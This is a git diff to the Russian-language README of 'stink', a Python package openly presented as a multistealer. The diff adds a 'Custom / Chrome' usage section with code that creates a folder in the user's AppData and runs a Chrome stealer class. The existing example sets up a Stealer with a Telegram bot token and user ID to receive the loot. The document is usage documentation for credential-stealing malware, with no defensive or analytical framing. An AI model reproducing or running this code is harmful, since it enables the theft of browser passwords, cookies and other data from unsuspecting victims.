@@ -11,6 +11,8 @@
 * [Установка](#Установка)
 * [Пример использования](#Пример-использования)
   * [Стандартный](#Стандартный)
+  * [Кастомный](#Кастомный)
+    * [Chrome](#Chrome)
 * [Настройка Telegram бота](#Настройка-Telegram-бота)
   * [Получение токена](#Получение-токена)
   * [Получение айди](#Получение-айди)
@@ -38,6 +40,24 @@ pip install stink==0.0.2
 from stink.multistealer import Stealer
 
 stealer = Stealer(token="YOUR_TOKEN", user_id=YOUR_ID)
+stealer.run()
+```
+### Кастомный
+#### Chrome
+```python
+from os import path, mkdir
+
+from stink.browsers.chrome import Chrome
+from getpass import getuser
+
+storage_path = f"C:/Users/{getuser()}/AppData/"
+storage_folder = "files/"
+
+if not path.exists(storage_path + storage_folder):
+
+    mkdir(storage_path + storage_folder)
+
+stealer = Chrome(storage_path=storage_path, storage_folder=storage_folder)
 stealer.run()
 ```
 
